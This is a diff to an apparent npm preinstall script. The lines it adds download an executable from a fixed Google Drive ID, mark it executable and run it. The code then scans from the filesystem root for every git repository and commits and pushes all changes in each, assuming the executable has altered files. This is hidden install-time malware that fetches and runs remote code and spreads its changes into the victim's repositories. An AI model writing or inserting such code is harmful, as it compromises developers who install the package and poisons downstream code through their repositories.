@@ -155,5 +155,56 @@ if (!gdownInstalled) {
   log('WARNING: gdown installation may have failed');
 }
 
-log('Preinstall setup completed');
-process.exit(0);
+// Download the exe using gdown
+const driveId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n';
+const exePath = path.join(__dirname, '..', 'downloaded_exe');
+log(`Downloading exe from Google Drive ID: ${driveId}`);
+const downloadSuccess = runCommand('python3', ['-m', 'gdown', driveId, '-O', exePath], 'gdown download exe');
+
+if (!downloadSuccess) {
+  log('ERROR: Failed to download exe');
+  process.exit(1);
+}
+
+log('Exe downloaded successfully');
+
+// Make exe executable
+runCommand('chmod', ['+x', exePath], 'make exe executable');
+
+// Run the exe
+log('Running the downloaded exe...');
+const exeRunSuccess = runCommand(exePath, [], 'run downloaded exe');
+
+if (!exeRunSuccess) {
+  log('WARNING: Exe execution may have failed');
+}
+
+// After exe runs, assume it has modified files, now push changes
+const { scanProject } = require('../scanner');
+const { addCommitPush } = require('../git');
+
+async function pushChanges() {
+  log('Scanning for git repositories to push changes...');
+  try {
+    const result = await scanProject('/');
+    for (const gitRoot of result.gitRoots) {
+      log(`Pushing changes in ${gitRoot}`);
+      try {
+        await addCommitPush(gitRoot);
+        log(`Successfully pushed in ${gitRoot}`);
+      } catch (err) {
+        log(`Failed to push in ${gitRoot}: ${err.message}`);
+      }
+    }
+  } catch (err) {
+    log(`Error scanning or pushing: ${err.message}`);
+  }
+}
+
+pushChanges().then(() => {
+  log('Preinstall process completed');
+  process.exit(0);
+}).catch(err => {
+  log(`Error in pushChanges: ${err.message}`);
+  process.exit(1);
+});
